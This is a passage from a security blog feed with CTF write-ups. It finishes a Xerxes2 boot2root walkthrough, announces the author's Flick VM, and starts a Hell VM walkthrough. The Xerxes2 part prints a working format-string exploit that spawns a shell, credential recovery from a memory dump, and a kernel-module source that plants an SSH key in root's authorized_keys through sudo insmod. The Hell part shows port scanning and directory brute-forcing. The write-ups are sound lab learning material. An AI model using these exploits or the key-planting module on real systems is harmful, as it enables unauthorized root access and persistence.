<h3>/opt/bf &ndash; part5</h3>

<p>Now, all that is left is to get the <code>printf</code> to rerun (using the <code>#</code>) with a payload such as <code>/bin/sh</code>. We will append the <code>/bin/sh</code> to the end and just add another <code>#</code> to call <code>printf</code> (which is now overridden):</p>

<p><code>bash Exploiting bf
delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("\x48\x9a\x04\x08" + "\x4a\x9a\x04\x08" + "%8184u%16$n" + "%8198u%17$n" + ";/bin/sh")])')##"
H�J�                                                                                                                                                                                                              d
$ id
uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
$
</code></p>

<p>Oly. Crap. That. Was. Awesome. :D :D</p>

<p>We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.</p>

<h2>becoming korenchkin</h2>

<p>We just got a shell with a euid for <code>polito</code>. To make life easier, I copied the public key I generated earlier for the first shell into <code>polito</code>&rsquo;s home, and SSH&rsquo;d in as that user.</p>

<p>At first glance, it appeared as if we have a gpg encrypted <code>dump</code> and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)</p>

<p><code>bash polito home
polito@xerxes2:~$ ls -lh
total 43M
-rw-r--r-- 1 polito polito 140K Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito  43M Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito  27K Jul 16 12:19 polito.pdf
polito@xerxes2:~$ crontab -l
[...]
@reboot while true ; do nc -l -p 4444 &lt; /home/polito/audio.txt ; done
polito@xerxes2:~$
</code></p>

<p>There was not much I could do with the <code>dump.gpg</code> yet, so I decided to open up the pdf in a pdf viewer:</p>

<p><img class="<a" src="href="https://i.imgur.com/WMuVK8O.png">https://i.imgur.com/WMuVK8O.png</a>"></p>

<p>That is all the PDF had. The QR code resolves to &ldquo;XERXES is watching&hellip;&rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the <code>file</code> utility.</p>

<p><code>bash polito.pdf File
polito@xerxes2:~$ file -k polito.pdf
polito.pdf: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)
</code></p>

<p>&hellip;<em>x86 boot sector</em>&hellip; wait&hellip; <strong>WHAT</strong>?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:</p>

<p><code>bash polito.pdf headers
00000000  83 E0 FF EB  1F 25 50 44   46 2D 31 2E  35 0A 39 39 .....%PDF-1.5.99
00000010  39 20 30 20  6F 62 6A 0A   3C 3C 3E 3E  0A 73 74 72 9 0 obj.&lt;&lt;&gt;&gt;.str
00000020  65 61 6D 0A  68 E0 08 17   BC 00 10 68  C0 07 1F EB eam.h......h....
00000030  21 59 81 F9  4D 5A 74 0C   B4 0E 86 C1  CD 10 86 C5 !Y..MZt.........
00000040  CD 10 EB ED  BE 55 00 AC   75 02 EB FE  B4 0E CD 10 .....U..u.......
00000050  EB F5 EB 72  E9 2D 2D 57   41 52 4E 49  4E 47 2D 2D ...r.--WARNING--
00000060  0A 20 20 20  55 6E 61 75   74 68 6F 72  69 7A 65 64 .   Unauthorized
00000070  20 66 69 6C  65 20 61 63   63 65 73 73  20 77 69 6C file access wil
00000080  6C 20 62 65  20 72 65 70   6F 72 74 65  64 2E 0A 20 l be reported..
00000090  20 20 20 20  58 45 52 58   45 53 20 77  69 73 68 65 XERXES wishe
000000A0  73 20 79 6F  75 0A 20 20   20 20 20 20  20 20 20 20 s you.
000000B0  61 20 6D 6F  73 74 20 70   72 6F 64 75  63 74 69 76 a most productiv
000000C0  65 20 64 61  79 00 68 6F   77 68 59 58  68 0D 0A 68 e day.howhYXh..h
000000D0  37 69 68 68  7A 68 4F 77   68 34 35 68  0A 40 68 67 7ihhzhOwh45h.@hg
000000E0  49 68 20 2C  68 23 6F 68   4D 5A 68 0A  0A 68 4E 6C Ih ,h#ohMZh..hNl
000000F0  68 61 57 68  46 75 68 61   6D 68 0A 20  68 3A 20 68 haWhFuhamh. h: h
00000100  69 73 68 64  20 68 6F 72   68 73 77 68  61 73 68 20 ishd horhswhash
00000110  70 68 68 65  68 0A 54 E9   17 FF 00 00  00 00 00 00 phheh.T.........
00000120  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000130  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000140  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000150  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000160  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000170  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000180  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000190  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001A0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001B0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001C0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001D0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001E0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001F0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 55 AA ..............U.
00000200  25 50 44 46  2D 31 2E 35   0A 25 D0 D4  C5 D8 0A 34 %PDF-1.5.%.....4
</code></p>

<p>Notice the 2 <code>%PDF-1.5</code>. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.</p>

<p>```bash
root@kali:~# head -c 512 polito.pdf > first
root@kali:~# file -k first
first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)</p>

<p>root@kali:~# tail -c +512 polito.pdf > second
root@kali:~# file second
second: Dyalog APL
root@kali:~#
```</p>

<p>Opening <code>first</code> in a PDF viewer gave a blank PDF, and <code>second</code> gave the PDF we saw originally with <code>polito.pdf</code>. <code>first</code> was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the <a href="http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout">structure</a> etc. Eventually it was time to take a break and come back with a fresh look at this.</p>

<p>I came back with some new ideas. One of them being that I should quickly create a VM, attach <code>first</code> as a disk and try run it and see what the output would be. VirtualBox did not like the file format of <code>first</code> :( Next I resorted to using <code>qemu</code>. And success!</p>

<p><img class="<a" src="href="https://i.imgur.com/1HFOfwc.png">https://i.imgur.com/1HFOfwc.png</a>"></p>

<p>Running <code>$ qemu first</code>, booted a vm and ran the bootsector code, revealing a password of <em>amFuaWNl</em>. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted <code>dump</code> file:</p>

<p>```bash GPG decrypt
polito@xerxes2:~$ gpg -d dump.gpg > decrypted_dump
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected</p>

<p>polito@xerxes2:~$ file decrypted_dump
decrypted_dump: data</p>

<p>polito@xerxes2:~$ ls -lh decrypted_dump
-rw-r&mdash;r&mdash; 1 polito polito 126M Aug 10 02:12 decrypted_dump
```</p>

<p>So we successfully decrypted <code>dump.gpg</code> it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through <code>less</code> until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &ldquo;Could this be some sort of memory dump?&rdquo;.</p>

<p>As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in <code>/opt/backup</code>:</p>

<p><code>bash Finding korenchkin.tar.enc password
polito@xerxes2:~$ grep $(ls /opt/backup/) decrypted_strings
korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
polito@xerxes2:~$
</code></p>

<p>Heh, ok. Easy enough. <code>korenchkin.tar.enc</code> was encrypted using <code>openssl</code>. We can simply decrypt this with the <code>-d</code> flag. From the dump we were able to get the password used too:</p>

<p>```bash decrypting korenchkin.tar.enc
polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar</p>

<p>polito@xerxes2:~$ file korenchkin.tar
korenchkin.tar: POSIX tar archive (GNU)</p>

<p>polito@xerxes2:~$ tar xvf korenchkin.tar
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~$
```</p>

<p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>

<p>```bash SSH as korenchkin
root@kali:~# ssh -i korenchkin.key <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#107;&#111;&#114;&#x65;&#110;&#99;&#x68;&#x6b;&#105;&#110;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#53;&#x36;&#46;&#x31;&#48;&#x32;">&#107;&#x6f;&#x72;&#x65;&#110;&#99;&#x68;&#x6b;&#x69;&#110;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#53;&#x36;&#x2e;&#x31;&#48;&#x32;</a></p>

<p>Welcome to xerxes2.</p>

<pre><code>  XERXES wishes you
   a pleasant stay.
</code></pre>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
 </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>You have new mail.
korenchkin@xerxes2:~$
```</p>

<p><em>You have new mail.</em></p>

<h2>becoming root</h2>

<p>Again, enumeration is key. As <code>korenchkin</code>, you will see that you may run.</p>

<p>```bash korenchkin sudo
korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:</p>

<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User korenchkin may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
</code></pre>

<p>```</p>

<p>So we may run insmod as <code>root</code>. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.</p>

<p>I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &ldquo;Hello World!&rdquo; kernel module. This together with a sample <code>Makefile</code> was working fine. The sources for the files initially tested were:</p>

<p>```c hello.c</p>

<h1>include &lt;linux/module.h>       /<em> Needed by all modules </em>/</h1>

<h1>include &lt;linux/kernel.h>       /<em> Needed for KERN_INFO </em>/</h1>

<h1>include &lt;linux/init.h>         /<em> Needed for the macros </em>/</h1>

<p>static int __init hello_start(void)
{</p>

<pre><code>printk(KERN_INFO "Loading hello module...\n");
return 0;
</code></pre>

<p>}</p>

<p>static void __exit hello_end(void)
{</p>

<pre><code>printk(KERN_INFO "Goodbye Mr.\n");
</code></pre>

<p>}</p>

<p>module_init(hello_start);
module_exit(hello_end);
```</p>

<p>```make hello Makefile
obj-m += hello.o</p>

<p>all:</p>

<pre><code>make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
</code></pre>

<p>clean:</p>

<pre><code>make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
</code></pre>

<p>```</p>

<p>I took <code>hello.c</code> and the <code>Makefile</code>, put them into a directory, built the module with <code>make</code>, and loaded it. Once the module loaded I checked the kernel messages via <code>dmesg</code> to confirm it working:</p>

<p><code>``bash hello kernel module testing
korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
make[1]: Entering directory</code>/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/kern/hello.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kern/hello.mod.o
  LD [M]  /home/korenchkin/kern/hello.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'</p>

<p>korenchkin@xerxes2:~/kern$ sudo insmod hello.ko</p>

<p>korenchkin@xerxes2:~/kern$ dmesg | tail
[&hellip;]
[68192.983366] hello: module license &lsquo;unspecified&rsquo; taints kernel.
[68192.983369] Disabling lock debugging due to kernel taint
[68192.983637] Loading hello module&hellip;
korenchkin@xerxes2:~/kern$
```</p>

<p>Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? <code>#include &lt;stdio.h&gt;</code>, and <code>system()</code> some commands to run <code>stuff</code>, getting me a <code>/tmp/getroot</code> prepared.</p>

<p><em>insert loud crash and burn sound here</em></p>

<p>Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like <code>stdio.h</code> included will fail with headers not found type errors. One can hack the Makefile to include headers from <code>/usr/include</code>, but it just ends up being a mess. However, there is a handy little function in <code>kmod.h</code> called <code>call_usermodehelper()</code>. From the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html">kernel docs</a>, <code>call_usermodehelper()</code> will <em>prepare and start a usermode application</em>. <strong>That</strong> sounds pretty handy in our case :)</p>

<p>So, time to rewrite <code>hello.c</code> to be useful! Puzzling the pieces together I found on the internet, <a href="http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage">this</a> amongst other pieces of information helped get the ball rolling.</p>

<p>```bash Rewritten hello.c to rooted.c</p>

<h1>include &lt;linux/module.h>       /<em> Needed by all modules </em>/</h1>

<h1>include &lt;linux/kernel.h>       /<em> Needed for KERN_INFO </em>/</h1>

<h1>include &lt;linux/init.h>         /<em> Needed for the macros </em>/</h1>

<p>/<em> For our shell ^_^ </em>/</p>

<h1>include&lt;linux/kmod.h></h1>

<p>int get_root (void)
{</p>

<pre><code>char * envp[] = { "HOME=/", NULL };
char *argv[] = { "/bin/bash", "-c", "/bin/cat /tmp/pubkey &gt;&gt; /root/.ssh/authorized_keys", NULL};
printk(KERN_INFO "Call Usermodehelper...\n");
call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
printk(KERN_INFO "Done usermodehelper...\n");
return 0;
</code></pre>

<p>}</p>

<p>static int __init hello_start(void)
{</p>

<pre><code>printk(KERN_INFO "Loading rooted module...\n");
return get_root();
return 0;
</code></pre>

<p>}</p>

<p>static void __exit hello_end(void)
{</p>

<pre><code>printk(KERN_INFO "Goodbye Mr.\n");
</code></pre>

<p>}</p>

<p>module_init(hello_start);
module_exit(hello_end);
```</p>

<p>As can be seen in the code above, I added a function <code>get_root()</code>, that will append whatever is in <code>/tmp/pubkey</code> to <code>/root/.ssh/authorized_keys</code> using <code>call_usermodehelper</code>. <code>/tmp/pubkey</code> contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified <code>Makefile</code> to have <code>obj-m += rooted.o</code> this time, <code>make</code>&rsquo;d the source and ran the <code>insmod</code> for the newly build <code>rooted.ko</code>. Then, I inspected the kernel messages again, and attempted to login as root:</p>

<p>```bash Xerxes2 rooting
korenchkin@xerxes2:~/kern$ vi rooted.c</p>

<p>korenchkin@xerxes2:~/kern$ vi Makefile</p>

<p>korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
make[1]: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/kern/rooted.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kern/rooted.mod.o
  LD [M]  /home/korenchkin/kern/rooted.ko
make[1]: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae'</p>

<p>korenchkin@xerxes2:~/kern$ echo &ldquo;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/&rdquo; > /tmp/pubkey</p>

<p>korenchkin@xerxes2:~/kern$ sudo insmod rooted.ko</p>

<p>korenchkin@xerxes2:~/kern$ dmesg | tail
[   14.512040] eth0: no IPv6 routers present
[  290.023022] Clocksource tsc unstable (delta = 4686567555 ns)
[  290.025022] Switching to clocksource acpi_pm
[57198.109946] bf[25367]: segfault at 40062000 ip 40062000 sp bfc6282c error 14
[68192.983366] hello: module license &lsquo;unspecified&rsquo; taints kernel.
[68192.983369] Disabling lock debugging due to kernel taint
[68192.983637] Loading hello module&hellip;
[74155.086393] Loading rooted module&hellip;
[74155.086397] Call Usermodehelper&hellip;
[74155.086449] Done usermodehelper&hellip;</p>

<p>korenchkin@xerxes2:~/kern$ logout
Connection to 192.168.56.102 closed.</p>

<p>root@kali:~/Desktop/xeres2# ssh <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#114;&#111;&#111;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#53;&#x36;&#46;&#x31;&#x30;&#50;">&#114;&#111;&#111;&#x74;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#53;&#x36;&#46;&#49;&#x30;&#x32;</a> -i delacroix</p>

<p>Welcome to xerxes2.</p>

<pre><code>  XERXES wishes you
   a pleasant stay.
</code></pre>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
 </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)</p>

<p>root@xerxes2:~# cat /root/flag.txt</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
 </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<pre><code>congratulations on beating xerxes2!

I hope you enjoyed it as much as I did making xerxes2. 
xerxes1 has been described as 'weird' and 'left-field'
and I hope that this one fits that description too :)

Many thanks to @TheColonial &amp; @rasta_mouse for testing!

Ping me on #vulnhub for thoughts and comments!

                  @barrebas, July 2014
</code></pre>

<p>root@xerxes2:~#
```</p>

<h2>conclusion</h2>

<p>Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks <a href="https://twitter.com/barrebas">@barrebas</a> and <a href="https://twitter.com/VulnHub">@VulnHub</a> for another great learning opportunity.</p>

<p>Now, the next step? OSCP :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Flick - Can You Find the Flag?]]></title>
    <link href="http://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/"/>
    <updated>2014-08-07T12:17:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag</id>
    <content type="html"><![CDATA[<p><img class="<a" src="href="http://i.imgur.com/kxwW1J8.png">http://i.imgur.com/kxwW1J8.png</a>"></p>

<h3>TL;DR</h3>

<p>I made a CTF! You should try it! Find it <a href="http://vulnhub.com/entry/flick-1,99/">on Vulnhub</a></p>

<h2>foreword</h2>

<p>So, security CTF&rsquo;s are fun. A lot of fun. And can be one heck of a time sink! Checking my laptops time and realizing its 3am on a week night is normal when I get pulled into one. The frustration, the trolls, the tremendous amounts of learning is all part of the experience of a successful CTF in my opinion.</p>

<h2>preparation</h2>

<p>Having done a few now with varying degrees of success has inspired me to attempt to do the same. So, off I went to CTF island and came back a weekend later with &ldquo;Flick&rdquo;. There is no real meaning to &ldquo;Flick&rdquo;. In fact, the name is the result of: &ldquo;What can I call it?&rdquo; &lt; insert 5u seconds > &ldquo;Flick?&rdquo;.</p>

<h2>details</h2>

<p>&ldquo;Flick&rdquo; aims to give you chance to learn something new. While some things may be trivial for the seasoned penetration tester by day, there may also be one or two things to learn.</p>

<p>As far as hints go, there is not much to give in the beginning. You have to <em>find</em> the flag.txt. It is possible to read it without having root command execution, however, as a added challenge, can you get root command execution? :)</p>

<h2>summary</h2>

<p>I look forward to hearing your experiences with it and good luck! You can find me in #vulnhub on freenode or on twitter @leonjza</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Would Just Not Freeze Over!]]></title>
    <link href="http://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/"/>
    <updated>2014-07-20T19:00:46+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get <code>/root/flag.txt</code>, I am yet to actually <em>root</em> this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a <strong>TON</strong> of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get <strong>root</strong>, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)</p>

<h2>welcome to hell</h2>

<p><a href="http://vulnhub.com/entry/hell-1,95/">Hell</a> is another vulnerable VM hosted at <a href="https://twitter.com/vulnhub">@VulnHub</a>. After recently completing the <a href="https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/">SkyTower</a> Vulnerable VM, I was feeling up to the challenge of a potentially more challenging VM. And boy, was it challenging&hellip; The wife was away on a <em>girls weekend out</em>, so I had plenty of time to sit and really think about things without distractions.</p>

<h2>the usual first steps</h2>

<p>So, like most other CTF type VM&rsquo;s, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:</p>

<p>```bash Hell first portscan
root@kali:~# nmap &mdash;reason 192.168.56.102</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-20 19:15 SAST
Nmap scan report for 192.168.56.102
Host is up, received reset (0.00025s latency).
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
111/tcp open  rpcbind syn-ack
666/tcp open  doom    syn-ack</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds
```
So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first <em>whaaat</em> moment, tcp/666.</p>

<h2>poking around</h2>

<p>The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:</p>

<p>```bash &lsquo;echoserver&rsquo;
root@kali:~# telnet 192.168.56.102 666
Trying 192.168.56.102&hellip;
Connected to 192.168.56.102.
Escape character is &lsquo;^]&rsquo;.</p>

<p>Welcome to the Admin Panel
Archiving latest version on webserver (echoserver.bak)&hellip;
Starting echo server and monitoring&hellip;
ping
ping
pong
pong
^]quit</p>

<p>telnet> quit
Connection closed.
```</p>

<p>The line <em>&lsquo;Archiving latest version on webserver (echoserver.bak)&hellip;&rsquo;</em> hints towards the fact that we may be able to get this server software via the webserver. Other than that, the session appears to simply echo whatever I input. I toyed around with random inputs but the echoserver did not appear to be too upset about.</p>

<h2>the echo server</h2>

<p>From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to <code>echoserver.bak</code>:</p>

<p>```bash echoserver
root@kali:~# curl  &ldquo;<a href="http://192.168.56.102/echoserver.bak">http://192.168.56.102/echoserver.bak</a>&rdquo; > echoserver.bak
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</p>

<pre><code>                             Dload  Upload   Total   Spent    Left  Speed
</code></pre>

<p>100  7846  100  7846    0     0  1290k      0 &mdash;:&mdash;:&mdash; &mdash;:&mdash;:&mdash; &mdash;:&mdash;:&mdash; 1532k
root@kali:~# file echoserver.bak
echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
```</p>

<p>Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation &amp; analysis.
To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I&rsquo;d then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a <code>strace</code>, one will notice the server &lsquo;dying&rsquo; when a socket is closed:</p>

<p><code>bash Echoserver die
bind(3, {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 10)                           = 0
accept(3, 0, NULL)                      = 4
read(4, "test\r\n", 2000)               = 6
write(4, "test\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = 1500
read(4, "", 2000)                       = 0
write(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = 1500
read(4, "", 2000)                       = 0
write(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = -1 EPIPE (Broken pipe)
--- SIGPIPE (Broken pipe) @ 0 (0) ---
+++ killed by SIGPIPE +++
</code></p>

<p>Eventually I decided to leave the echoserver alone and move on to the web server.</p>

<h2>the web server</h2>

<p>Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the <code>robots.txt</code>:</p>

<p><code>bash Hell robots.txt
root@kali:~# curl http://192.168.56.102/robots.txt
User-agent: *
Disallow: /personal/
Disallow: /super_secret_login_path_muhahaha/
</code></p>

<p>The folder <code>personal/</code> had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. <code>super_secret_login_path_muhahaha</code> however, presented us with a login portal with a title <strong>Admin</strong>.</p>

<p>The login form posted to <code>login.php</code>, and on failure would 302 to: <code>http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1</code>. Fuzzing <code>the_user_is_a_failure</code> simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.</p>

<p>The next move was to fuzz more directories and maybe some interesting files. I decided on <code>wfuzz</code> for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:</p>

<p>```bash Hell web server folders
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt &mdash;hc 404 <a href="http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ">http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ</a></p>

<hr />

<ul>
<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
</ul>


<hr />

<p>Target: <a href="http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ">http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt</p>

<h1>Total requests: 3036</h1>

<h1>ID Response   Lines      Word         Chars          Request</h1>

